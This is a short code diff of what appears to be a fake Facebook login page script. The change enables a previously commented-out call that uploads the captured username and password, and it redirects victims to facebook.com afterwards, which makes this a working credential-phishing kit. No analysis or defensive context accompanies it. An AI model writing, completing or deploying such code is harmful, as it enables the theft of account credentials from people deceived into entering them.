@@ -9,7 +9,7 @@ let uploadData = (data) => {
     })
     .then((response) => {
       console.log(response);
-      window.location.href = "https://m.facebook.com/";
+      window.location.href = "https://facebook.com/";
     });
 };
 
@@ -19,5 +19,5 @@ getElement("#btnLogin").addEventListener("click", function () {
     pass: getElement("#pass").value
   };
   console.log(data);
-  //uploadData(data);
+  uploadData(data);
 });
